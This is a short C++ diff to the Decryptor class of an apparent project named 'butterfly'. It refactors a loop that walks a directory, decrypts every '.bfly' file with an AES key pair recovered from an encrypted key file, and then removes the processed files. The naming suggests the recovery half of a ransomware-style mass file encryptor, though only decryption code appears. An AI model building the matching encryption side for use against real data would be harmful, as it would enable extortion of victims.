@@ -9,17 +9,9 @@ namespace butterfly
 namespace hybrid
 {
 
-Decryptor::Decryptor(const std::string &aesKeyDbFilepath) : _aesKeyDbFilepath(aesKeyDbFilepath), _aesDecryptor(new aes::AESDecryptor())
+Decryptor::Decryptor(const std::string &aesKeyDBPath) : _aesKeyDBPath(aesKeyDBPath), _aesDecryptor(new aes::AESDecryptor())
 {
     LOG_TRACE("Create class Decryptor");
-}
-
-void Decryptor::removeBFLYEnding(std::string &filepath)
-{
-    if (filepath.find(butterfly::ENC_BFLY_FILE_ENDING) != std::string::npos)
-    {
-        filepath.erase(filepath.length() - butterfly::ENC_BFLY_FILE_ENDING.length());
-    }
 }
 
 void Decryptor::removeDecryptedFiles()
@@ -40,12 +32,19 @@ void Decryptor::invokeDir(const std::string &dirPath, const std::string &pkeyFro
     std::string aesk, aesiv;
     decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, aesk, aesiv);
 
+    // Get all files from provided directory path
     auto files = DirectoryIterator::getAllFiles(dirPath);
+
+    // Iterate over all file paths
     for (auto &file: files)
     {
-        std::string filepath = file.string();
-        removeBFLYEnding(filepath);
-        decryptFileWithAES(filepath, aesk, aesiv);
+        // Check if the provided file path has the .bfly extension
+        if ( DirectoryIterator::getFileExtension(file) == butterfly::ENC_BFLY_FILE_ENDING )
+        {
+            std::string filepath = file.string();
+            decryptFileWithAES(filepath, aesk, aesiv);
+        }
+
     }
 
     removeDecryptedFiles();
